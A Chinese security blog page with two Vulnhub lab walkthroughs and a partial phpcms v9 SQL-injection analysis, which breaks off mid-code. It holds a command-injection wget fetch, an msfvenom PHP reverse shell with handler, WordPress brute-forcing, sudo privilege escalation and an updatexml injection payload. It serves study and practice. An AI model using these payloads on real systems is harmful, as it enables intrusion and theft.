    <article id="post-hackNos-ReconForce-vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/10/hackNos-ReconForce-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-02-10T14:21:24.000Z" itemprop="datePublished">2020-02-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/10/hackNos-ReconForce-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">hackNos-ReconForce-vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶机：hackNos-ReconForce-vulnhub渗透测试</p>
<p>靶机IP：192.168.0.11</p>
<p>KALI IP：192.168.0.9</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>nmap扫描端口，这里有21端口，22端口还有80端口。</p>
<p><img src="/.com//1.png" alt="image-20200208193927841"></p>
<p>先看ftp端口，暂且没有用。</p>
<p><img src="/.com//2.png" alt="image-20200208194607086"></p>
<p>80端口看看有啥。直接访问，很酷的页面。</p>
<p><img src="/.com//3.png" alt="image-20200208194721495"></p>
<p>点击<code>TroubleShoot</code>会跳出用户认证</p>
<p><img src="/.com//4.png" alt="image-20200208195132272"></p>
<p><strong>社工来了，猜！！！</strong></p>
<p>用户名为<code>root</code>或者<code>admin</code></p>
<p>密码为<code>Recon Security</code>和<code>Secure@hackNos</code>的组合…..</p>
<p>所以尝试密码为：<code>Security@hackNos</code></p>
<p><img src="/.com//5.png" alt="image-20200208195430056"></p>
<p>尝试命令<code>127.0.0.1|ls</code></p>
<p><img src="/.com//6.png" alt="image-20200208195530256"></p>
<p>然后尝试<code>127.0.0.1|out.php</code></p>
<p><img src="/.com//7.png" alt="image-20200208195652993"> 看到了过滤规则</p>
<p>然后我们尝试写木马进去，用于后期反弹shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.0</span><span class="number">.9</span> LPORT=<span class="number">1234</span> R &gt;shell.txt</span><br></pre></td></tr></table></figure>

<p><img src="/.com//8.png" alt="image-20200208200040298"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">记得把其中的<span class="string">'/*'</span>删掉</span><br></pre></td></tr></table></figure>

<p>把该txt文件移入<code>/var/www/html</code></p>
<p>在靶机执行如下命令</p>
<p><code>127.0.0.1|wget http://192.168.0.9/shell.txt</code></p>
<p><img src="/.com//9.png" alt="image-20200208200525068"></p>
<p>然后执行<code>127.0.0.1|cp shell.txt shell.php</code></p>
<p>这样shell就写入成功</p>
<p><img src="/.com//10.png" alt="image-20200208200638835"></p>
<p>KALI开启msf</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">multi</span>/<span class="title">handler</span></span><br><span class="line"><span class="title">set</span> <span class="title">payload</span> <span class="title">php</span>/<span class="title">meterpreter</span>/<span class="title">reverse_tcp</span></span><br><span class="line"><span class="title">set</span> <span class="title">lhost</span> 192.168.0.9</span><br><span class="line"><span class="title">set</span> <span class="title">lport</span> 1234</span><br><span class="line"><span class="title">exploit</span></span><br></pre></td></tr></table></figure>

<p>然后访问<code>http://192.168.0.11/5ecure/shell.php</code>触发shell</p>
<p><img src="/.com//11.png" alt="image-20200208200947344"></p>
<p>然后获得tty</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//12.png" alt="image-20200208201301794"></p>
<p>然后<code>cat /etc/passwd</code></p>
<p><img src="/.com//13.png" alt="image-20200208201422064"></p>
<p>在这里看到<code>recon</code>的用户</p>
<p>最有意思的地方来了,<strong>又是社工，recon的密码可能会是和之前的登陆密码一样。就这种密码一样的情况就很常见，密码：Security@hackNos</strong></p>
<p><img src="/.com//14.png" alt="image-20200208202514673"></p>
<p><code>recon</code>可以执行任意用户权限的任意命令……</p>
<p><img src="/.com//15.png" alt="image-20200208203020932"></p>
<p>提权成功</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>社工吧。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/10/hackNos-ReconForce-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5jr000ykou5btdyfsfi" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-five86-2-vulnhub渗透测试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/10/five86-2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
  <time datetime="2020-02-10T14:19:04.000Z" itemprop="datePublished">2020-02-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/10/five86-2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">five86-2-vulnhub渗透测试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶机:vulnhub-five86:2</p>
<p>靶机IP:192.169.0.10</p>
<p>kali IP:192.168.0.9</p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p><img src="/.com//1.png" alt="image-20200203232242695"></p>
<p>看到这个wordpress的服务，就想起之前的渗透思路</p>
<p>要么强行登后台传shell.要么扫描插件。</p>
<p>题外话：因为wordpress解析的问题，所以我们先修改一下hosts文件.</p>
<p><img src="/.com//2.png" alt="image-20200204115104354"></p>
<p>使用wpscan对网站用户进行枚举。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:<span class="comment">//five86-2 -e u</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//4.png" alt="image-20200205010349176"></p>
<p>枚举成功，然后对用户名进行强力爆破</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:<span class="comment">//five86-2 -e u /usr/share/wordlists/rockyou.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="image-20200204141150967"></p>
<p>因为字典太大了，然后就爆出了两个</p>
<p><code>barney:spooky1</code>以及<code>stephen:apollo1</code></p>
<p>使用<code>barney</code>用户名登陆</p>
<p>登陆后，看看这个wordpress安装了哪些插件。</p>
<p><img src="/.com//5.png" alt="image-20200205013424933"></p>
<p>这个插件在运行，百度一下，发现这个插件实际上是存在漏洞的。</p>
<p>参考文章：<a href="https://www.freebuf.com/vuls/205735.html" target="_blank" rel="noopener">WordPress插件IEAC漏洞分析及组合利用尝试</a></p>
<p>然后上传shell</p>
<p><img src="/.com//10.png" alt="image-20200206124154950"></p>
<p><img src="/.com//9.png" alt></p>
<p>然后试着反弹shell.为了反弹shell.我们得重新上传一个zip包，然后这个包里有index.html还有shell.php</p>
<p>shell.php获得地址：<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">php-reverse-shell | pentestmonkey</a></p>
<p>反弹shell成功</p>
<p><img src="/.com//11.png" alt="image-20200206124833229"></p>
<p>获得tty</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>



<p>查看<code>/etc/passwd</code></p>
<p><img src="/.com//12.png" alt="image-20200206125040357"></p>
<p>发现我们之前爆出来的账号刚好在这几个用户名里，发现账号可以切换至<code>stephen</code></p>
<p><img src="/.com//13.png" alt="image-20200206125426106"></p>
<p>发现没有东西可以用来提取，然后先前的ftp没有用上，查看进程</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -auxwww</span><br></pre></td></tr></table></figure>

<p><img src="/.com//14.png" alt="image-20200206132202268"></p>
<p>这里的进程说明这里在上传一个<code>file.txt</code></p>
<p>然后流量抓包，查看一个有哪些网卡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -D</span><br></pre></td></tr></table></figure>

<p><img src="/.com//15.png" alt="image-20200206132654958"></p>
<p>这一步在stephen的<code>/var/tmp</code>下完成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i br-eca3858d86bf -w ftp.pcap</span><br></pre></td></tr></table></figure>



<p>然后回到www-data用户，然后把<code>ftp.pcap</code>复制到/var/www/html</p>
<p><img src="/.com//16.png" alt="image-20200206142907241"></p>
<p>kali下载该文件，流量分析，发现paul</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paul::esomepasswford</span><br></pre></td></tr></table></figure>

<p>登陆</p>
<p><img src="/.com//17.png" alt="image-20200206143348617"></p>
<p>可提权至peter</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u peter service ../../bin/sh</span><br></pre></td></tr></table></figure>

<p><img src="/.com//18.png" alt="image-20200206143559187"></p>
<p>发现peter可以修改root用户密码</p>
<p><img src="/.com//19.png" alt="image-20200206143750710"></p>
<p>成功提取</p>
<p><img src="/.com//20.png" alt="image-20200206143857485"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>学到好多，晚点写一下最近的渗透总结</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/10/five86-2-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="ck8sqr5jn000wkou55oxu5efv" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-phpcmsv9Sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2020-02-06T16:43:43.000Z" itemprop="datePublished">2020-02-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">phpcmsv9Sql注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9的sql注入漏洞</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h2><p>实际上这个是一个后台的漏洞.</p>
<p>首先漏洞的触发点<code>./phpcms/modules/content/down.php::init()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$a_k = trim($_GET[<span class="string">'a_k'</span>]);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">unset</span>($i,$m,$f);</span><br><span class="line">	parse_str($a_k);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</span><br><span class="line">	$allow_visitor = <span class="number">1</span>;</span><br><span class="line">	$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</span><br><span class="line">	$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</span><br><span class="line">	$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));	</span><br><span class="line">	$siteids = getcache(<span class="string">'category_content'</span>,<span class="string">'commons'</span>);</span><br><span class="line">	$siteid = $siteids[$catid];</span><br><span class="line">	$CATEGORYS = getcache(<span class="string">'category_content_'</span>.$siteid,<span class="string">'commons'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">$this</span>-&gt;category = $CATEGORYS[$catid];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;category_setting = string2array(<span class="keyword">$this</span>-&gt;category[<span class="string">'setting'</span>]);</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p><code>$a_k</code>由GET请求获得.<code>$a_k</code>要解密,所以说<code>$a_k</code>是一段密文.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</span><br></pre></td></tr></table></figure>

<p>然后<code>$a_k</code>经过<code>parse_str()</code>获得<code>$i,$m,$modelid,$catid,$f,$id</code></p>
<p>其中关键代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_one</span><span class="params">($where = <span class="string">''</span>, $data = <span class="string">'*'</span>, $order = <span class="string">''</span>, $group = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array($where)) $where = <span class="keyword">$this</span>-&gt;sqls($where);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;get_one($data, <span class="keyword">$this</span>-&gt;table_name, $where, $order, $group);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqls</span><span class="params">($where, $font = <span class="string">' AND '</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (is_array($where)) &#123;</span><br><span class="line">		$sql = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($where <span class="keyword">as</span> $key=&gt;$val) &#123;</span><br><span class="line">			$sql .= $sql ? <span class="string">" $font `$key` = '$val' "</span> : <span class="string">" `$key` = '$val'"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $sql;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $where;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>select * from where  id= &#39;xxx&#39;</code>单引号字符型注入.</p>
<p>payload如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%<span class="number">27</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">1</span>,user())),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>





<p>根据<code>$id</code>进行查查询,返回结果.在这里没有进行字符串的过滤,所以存在一定的sql注入漏洞.</p>
<p>那么这个漏洞的触发方式:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=content&amp;c=down&amp;a=init&amp;a_k=密文</span><br></pre></td></tr></table></figure>





<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>定位到:<code>./phpcms/modules/attachement/attachements.php::swfupload_json()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">defined(<span class="string">'IN_PHPCMS'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'No permission resources.'</span>); </span><br><span class="line">$session_storage = <span class="string">'session_'</span>.pc_base::load_config(<span class="string">'system'</span>,<span class="string">'session_storage'</span>);</span><br><span class="line">pc_base::load_sys_class($session_storage);</span><br><span class="line"><span class="keyword">if</span>(param::get_cookie(<span class="string">'sys_lang'</span>)) &#123;</span><br><span class="line">	define(<span class="string">'SYS_STYLE'</span>,param::get_cookie(<span class="string">'sys_lang'</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	define(<span class="string">'SYS_STYLE'</span>,<span class="string">'zh-cn'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">attachments</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $att_db;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		pc_base::load_app_func(<span class="string">'global'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload_path = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_path'</span>);		</span><br><span class="line">		<span class="keyword">$this</span>-&gt;imgext = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'gif'</span>,<span class="string">'png'</span>,<span class="string">'bmp'</span>,<span class="string">'jpeg'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">'userid'</span>] ? $_SESSION[<span class="string">'userid'</span>] : (param::get_cookie(<span class="string">'_userid'</span>) ? param::get_cookie(<span class="string">'_userid'</span>) : sys_auth($_POST[<span class="string">'userid_flash'</span>],<span class="string">'DECODE'</span>));</span><br><span class="line">		<span class="keyword">$this</span>-&gt;isadmin = <span class="keyword">$this</span>-&gt;admin_username = $_SESSION[<span class="string">'roleid'</span>] ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;groupid = param::get_cookie(<span class="string">'_groupid'</span>) ? param::get_cookie(<span class="string">'_groupid'</span>) : <span class="number">8</span>;</span><br><span class="line">		<span class="comment">//判断是否登录</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;userid))&#123;</span><br><span class="line">			showmessage(L(<span class="string">'please_login'</span>,<span class="string">''</span>,<span class="string">'member'</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">   ...</span><br><span class="line">       ...</span><br><span class="line">   ...</span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 设置swfupload上传的json格式cookie</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</span><br><span class="line">		$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</span><br><span class="line">		$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</span><br><span class="line">		$json_str = json_encode($arr);</span><br><span class="line">		$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</span><br><span class="line">		$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</span><br><span class="line">		<span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</span><br><span class="line">			param::set_cookie(<span class="string">'att_json'</span>,$json_str);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>在<code>swfupload_json()</code>中通过GET请求,分别获得<code>aid,src,filename</code>,经过<code>json加密</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$json_str = json_encode($arr);</span><br></pre></td></tr></table></figure>



<p>判断是否已有<code>cookie</code>,由于未有cookie,所以在这里我们设置cookie.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</span><br><span class="line">$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</span><br><span class="line"><span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</span><br><span class="line">	param::set_cookie(<span class="string">'att_json'</span>,$json_str);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;			</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后跟进<code>set_cookie()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($var, $value = <span class="string">''</span>, $time = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	$time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</span><br><span class="line">	$s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">	$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;</span><br><span class="line">	$_COOKIE[$var] = $value;</span><br><span class="line">	<span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>($value <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">			setcookie($var.<span class="string">'['</span>.$k.<span class="string">']'</span>, sys_auth($v, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		setcookie($var, sys_auth($value, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用的加密函数<code>sys_auth(xxx,ENCODE)</code>与解密<code>$a_k</code>的<code>sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;))</code>函数是同一个函数</p>
<p>所以可以在这里生成密文.<code>$_GET[src]</code>可以作为写入payload的地方.只经过<code>safe_replace()</code>函数.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 安全过滤函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span 